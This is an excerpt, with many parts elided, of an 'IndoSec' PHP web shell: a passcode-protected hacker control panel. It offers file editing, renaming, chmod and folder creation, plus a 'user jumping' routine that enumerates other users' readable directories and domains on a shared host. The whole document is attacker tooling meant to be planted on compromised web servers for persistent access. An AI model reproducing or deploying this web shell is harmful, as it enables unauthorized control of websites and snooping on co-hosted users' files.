...
/* Configurasi */
$aupas = '1ac1bddadcb7dea96ed231e661eba215';
...
<html>
    <head>
        ...
        <title>{ INDOSEC }</title>
        <link rel="icon" type="image/png" href="https://i.ibb.co/dpWBYVY/hacker.png"/>
    ...
    <body class="bg-dark text-center text-light">
        <div class="container text-center mt-3">
            <h1>{ IndoSec }</h1>
            <center><p>
    <img src="https://i.ibb.co/dpWBYVY/hacker.png" width="150" height="150" alt="IndoSec"/>
  </p></center>
            ...
            <form method="post">
                <div class="form-group input-group">
                    ...
                    <input type="password" name="pass" placeholder="Passcode" class="form-control">
                </div>
                <input type="submit" class="btn btn-danger btn-block" class="form-control" value="Login">
            </form>
        </div>
        <a class="text-muted fixed-bottom mb-3">Copyright &copy IndoSec 2023</a>
    </body>
</html>
<?php
exit;
...
$imgfol = "<img src='https://i.ibb.co/yS102Lf/folder.png' class='ico'></img>";
...
function iconFile($ext) {
    if ($ext == 'php') {
        $img = 'https://i.ibb.co/G0tpGqb/php.png';
    } elseif ($ext == 'html') {
        $img = 'https://i.ibb.co/KG7nDrp/html.png';
    } elseif ($ext == 'css') {
        $img = 'https://i.ibb.co/FqZPZSB/css.png';
    } elseif ($ext == 'png') {
        $img = 'https://i.ibb.co/42By3XQ/png.png';
    } elseif ($ext == 'jpg') {
        $img = 'https://i.ibb.co/JCM2tG8/jpg.png';
    } elseif ($ext == 'jpeg') {
        $img = 'https://i.ibb.co/JCM2tG8/jpg.png';
    } elseif ($ext == 'zip') {
        $img = 'https://i.ibb.co/zS7XcQG/zip.png';
    } elseif ($ext == 'js') {
        $img = 'https://i.ibb.co/0C9FkZB/js.png';
    } elseif ($ext == 'tif') {
        $img = 'https://i.ibb.co/BjZTrzr/tif.png';
    } elseif ($ext == 'iso') {
        $img = 'https://i.ibb.co/HCH5JNp/iso.png';
    } elseif ($ext == 'txt') {
        $img = 'https://i.ibb.co/H2PgjPT/txt.png';
    } elseif ($ext == 'ico') {
        $img = 'https://i.ibb.co/kygbnkj/ico.png';
    } elseif ($ext == 'doc') {
        $img = 'https://i.ibb.co/j5hDVVr/doc.png';
    } elseif ($ext == '3ds') {
        $img = 'https://i.ibb.co/Hhnp38k/3ds.png';
    } elseif ($ext == 'dat') {
        $img = 'https://i.ibb.co/t3P1F1s/dat.png';
    } elseif ($ext == 'indsc') {
        $img = 'https://i.ibb.co/w48VtQs/indd.png';
    } elseif ($ext == 'sql') {
        $img = 'https://i.ibb.co/3cZf6GD/sql.png';
    } elseif ($ext == 'pl') {
        $img = 'http://i.imgur.com/PnmX8H9.png';
    } elseif ($ext == 'pdf') {
        $img = 'https://i.ibb.co/DYFbN9B/pdf.png';
    } elseif ($ext == 'mp4') {
        $img = 'https://i.ibb.co/RpQBFPp/mov.png';
    } elseif ($ext == 'mp3') {
        $img = 'https://i.ibb.co/MNmGpjQ/mp3.png';
    } elseif ($ext == 'gif') {
        $img = 'https://i.ibb.co/HnFxfcW/gif.png';
    } elseif ($ext == 'dll') {
        $img = 'https://i.ibb.co/WnhgL59/dll.png';
    } elseif ($ext == 'xml') {
        $img = 'https://i.ibb.co/Q9B4Xts/xml.png';
    } else {
        $img = 'https://i.ibb.co/KLLPc09/file.png';
    }
...
function about() {
    echo '<div class="card text-center bg-light about">
        ...
        <div class="card-body">
            ...
            <p class="card-text">We are seen as shadowy figures with superhuman powers. No system is secure.</p>
            <p class="card-text">{ INDOSEC }</p>
        </div>
        <div class="card-footer">
            <small class="card-text text-muted">Copyright &copy IndoSec 2023</small>
        </div>
    </div><br/>';
    exit;
}
...
function editFile($dir, $file, $nfile, $imgfile) {
    ...
    echo "<form method='POST'>
        ...
        if (is_array($is_image)) {
            echo '<h5>Cant Edit Image File</h5>';
        } else {
...
function renameFile($dir, $file, $nfile, $imgfile) {
    ...
    if (isset($_POST['rename_file'])) {
        ...
        if (file_exists($baru)) {
            $swa = 'success';
            $text = "Name $baru Successfully Changed";
            swall($swa, $text, $dir);
        } else {
            if (rename($lama, $baru)) {
                $swa = 'success';
                $text = "Successfully Change Name To $baru";
                swall($swa, $text, $dir);
            } else {
                $swa = 'error';
...
function chmodFolder($dir, $ndir) {
    ...
    if (isset($_POST['chmo'])) {
        if (@chmod($dir.'/'.$ndir, $_POST['perm'])) {
            echo '<font color="lime">Successfully Change Permission</font><br/>';
        } else {
...
function buatFolder($dir, $imgfol) {
    ...
    if (isset($_POST['buat'])) {
        ...
        if ($fd) {
            $swa = 'success';
            $text = 'Successfully Create Folder';
            swall($swa, $text, $dir);
        } else {
            $swa = 'error';
...
function renameFolder($dir, $ndir, $imgfol) {
    ...
    <form method='POST'>
        <input type='text' class='form-control' name='namanew' placeholder='Insert New Name' value='$ndir'><br/>
        <button type='sumbit' class='btn btn-info btn-block' name='ganti'>Change</button><br/>
    </form>";
                ...
                foreach ($user_jumping[1] as $user_pro_jump) {
                    ...
                    if (is_readable($user_jumping_dir)) {
                        ...
                        if (function_exists('posix_getpwuid')) {
                            ...
                            if ($domain_jump == '') {
                                echo ' => ( <font color=red>Gagal ambil nama domain</font> )<br>';
                            } else {
...
<html>
    ...
    <body class="bg-dark text-light">
        ...
        <style>
            ...
            .about .card-body .img{
                position: relative;
                background: url(https://i.ibb.co/dpWBYVY/hacker.png);
        ...
        <div class="container">
            <h1 class="text-center"><a style="color:#ffffff;">{ INDOSEC }</h1>
            ...
            <div class="text-center">
                <div class="d-flex justify-content-center flex-wrap">
                    ...
                    <a href="?about" class="fiture btn btn-warning btn-sm"><i class="fa fa-info"></i> About</a>
            ...
            <div class="col-md-7 mt-4">
                ...
                */
                ...
                <center><a class="text-muted">Copyright &copy IndoSec 2023</a></center><br/>
